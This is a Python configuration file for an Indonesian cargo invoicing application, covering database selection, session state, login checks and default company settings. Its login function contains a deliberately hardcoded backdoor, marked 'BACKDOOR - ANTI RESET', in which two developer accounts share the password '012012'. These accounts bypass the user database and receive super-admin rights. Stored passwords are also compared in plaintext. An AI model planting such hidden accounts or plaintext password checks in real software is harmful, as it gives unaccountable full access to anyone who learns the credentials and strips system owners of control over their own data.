# config.py
import sqlite3
import json
import os

# =====================================================================
# 🌟 BACA DATABASE AKTIF DARI ENVIRONMENT FILE
# =====================================================================
db_aktif = "database_cargo.db" # Default fallback
if os.path.exists("app_env.json"):
    try:
        with open("app_env.json", "r") as f:
            env_data = json.load(f)
            db_aktif = env_data.get("active_db", "database_cargo.db")
    except Exception:
        pass

# =====================================================================
# 1. VARIABEL SESI AKTIF (Manajer RAM / State Management)
# =====================================================================
CURRENT_SESSION = {
    "username": "",
    "role": "",
    "kode_cabang": "PUSAT",
    "nama_cabang": "KANTOR PUSAT",
    "db_name": db_aktif,
    "resi_prefix": "INV",
    "aturan_prefix": {}
}

# =====================================================================
# 🔒 2. AKUN RAHASIA PENGEMBANG (BACKDOOR - ANTI RESET)
# =====================================================================
DEVELOPER_ACCOUNTS = {
    'DEV_SUPER': '012012',
    'DEV_STAFF': '012012'
}

# =====================================================================
# 3. FUNGSI VALIDASI LOGIN PINTAR (MEMBACA MULTI-CABANG)
# =====================================================================
def verifikasi_login_sistem(username_input, password_input):
    username = username_input.strip().upper()
    password = password_input.strip()

    if username == "DEV_SUPER" and password == DEVELOPER_ACCOUNTS['DEV_SUPER']:
        CURRENT_SESSION['username'] = username
        CURRENT_SESSION['role'] = 'SUPER_ADMIN'
        CURRENT_SESSION['kode_cabang'] = 'DEV_SYS'
        CURRENT_SESSION['nama_cabang'] = 'SUPER MODE (DEV)'
        CURRENT_SESSION['aturan_prefix'] = {"PROVINSI A": "A", "PROVINSI B": "B", "PROVINSI C": "C"}
        return True, "SUPER_ADMIN", "DEVELOPER UTAMA"

    if username == "DEV_STAFF" and password == DEVELOPER_ACCOUNTS['DEV_STAFF']:
        CURRENT_SESSION['username'] = username
        CURRENT_SESSION['role'] = 'ADMIN'
        CURRENT_SESSION['kode_cabang'] = 'DEV_SYS'
        CURRENT_SESSION['nama_cabang'] = 'STAFF MODE (DEV)'
        CURRENT_SESSION['aturan_prefix'] = {"PROVINSI A": "A", "PROVINSI B": "B", "PROVINSI C": "C"}
        return True, "ADMIN", "DEVELOPER STAFF"

    try:
        conn = sqlite3.connect(CURRENT_SESSION['db_name'])
        cursor = conn.cursor()

        query = """
                SELECT u.password,
                       u.role,
                       u.nama_lengkap,
                       u.kode_cabang,
                       c.nama_cabang,
                       c.resi_prefix,
                       c.aturan_prefix
                FROM manajemen_user u
                         JOIN data_cabang c ON u.kode_cabang = c.kode_cabang
                WHERE u.username = ? \
                """
        cursor.execute(query, (username,))
        row = cursor.fetchone()
        conn.close()

        if row:
            db_pass, db_role, db_nama, kode_cabang, nama_cabang, resi_prefix, aturan_prefix = row

            if password == db_pass:
                CURRENT_SESSION['username'] = username
                CURRENT_SESSION['role'] = db_role
                CURRENT_SESSION['kode_cabang'] = kode_cabang
                CURRENT_SESSION['nama_cabang'] = nama_cabang
                CURRENT_SESSION['resi_prefix'] = resi_prefix

                try:
                    CURRENT_SESSION['aturan_prefix'] = json.loads(aturan_prefix)
                except json.JSONDecodeError:
                    CURRENT_SESSION['aturan_prefix'] = {"DEFAULT": resi_prefix}

                return True, db_role, db_nama

    except Exception as e:
        print(f"⚠️ Gagal mencocokkan login ke database: {e}")

    return False, None, None

# ============================================================
# 4. DATA BAWAAN (DEFAULT WHITE-LABEL) & FUNGSI PENGAMBIL DATA
# ============================================================
DEFAULT_CLIENT_DATA = {
    "nama_perusahaan": "PT EKSPEDISI KARGO",
    "alamat_perusahaan": "JL. INDONESIA NO. 77, SURABAYA",
    "telp_perusahaan": "0812-3456-7890 / (021) 123456",
    "logo_text_html": 'EKSPEDISI KARGO',
    "rekening_nonpajak": ["BANK, 1234567890, NAMA PERORANGAN"],
    "rekening_pajak": ["BANK, 1234567890, PT NAMA PERUSAHAAN"],
    "format_resi_manual": False,
    "template_no_resi": "[PREFIX][COUNTER][SUFFIX]",
    "kode_akhiran_pajak": "-P",
    "prefix_invoice": "INV",
    "provinsi_tujuan": ["PROVINSI A", "PROVINSI B", "PROVINSI C"]
}

DATA_CLIENT = DEFAULT_CLIENT_DATA.copy()

def muat_pengaturan_sistem():
    """Membaca konfigurasi dari database (Dipanggil HANYA setelah DB siap)."""
    hasil_db = {}
    try:
        conn = sqlite3.connect(CURRENT_SESSION['db_name'])
        cursor = conn.cursor()
        cursor.execute("SELECT kunci, nilai FROM pengaturan_sistem")
        rows = cursor.fetchall()
        conn.close()

        if rows:
            db_data = dict(rows)
            if 'nama_perusahaan' in db_data: hasil_db['nama_perusahaan'] = db_data['nama_perusahaan']
            if 'alamat_perusahaan' in db_data: hasil_db['alamat_perusahaan'] = db_data['alamat_perusahaan']
            if 'telp_perusahaan' in db_data: hasil_db['telp_perusahaan'] = db_data['telp_perusahaan']
            if 'logo_text_html' in db_data: hasil_db['logo_text_html'] = db_data['logo_text_html']

            if 'rekening_pajak' in db_data: hasil_db['rekening_pajak'] = json.loads(db_data['rekening_pajak'])
            if 'rekening_nonpajak' in db_data: hasil_db['rekening_nonpajak'] = json.loads(db_data['rekening_nonpajak'])

            if 'format_resi_manual' in db_data: hasil_db['format_resi_manual'] = str(db_data['format_resi_manual']) == '1'
            if 'template_no_resi' in db_data: hasil_db['template_no_resi'] = db_data['template_no_resi']
            if 'kode_akhiran_pajak' in db_data: hasil_db['kode_akhiran_pajak'] = db_data['kode_akhiran_pajak']
            if 'prefix_invoice' in db_data: hasil_db['prefix_invoice'] = db_data['prefix_invoice']
            if 'provinsi_tujuan' in db_data: hasil_db['provinsi_tujuan'] = json.loads(db_data['provinsi_tujuan'])

    except Exception as e:
        print(f"ℹ️ Database belum siap, melewati proses sinkronisasi: {e}")

    return hasil_db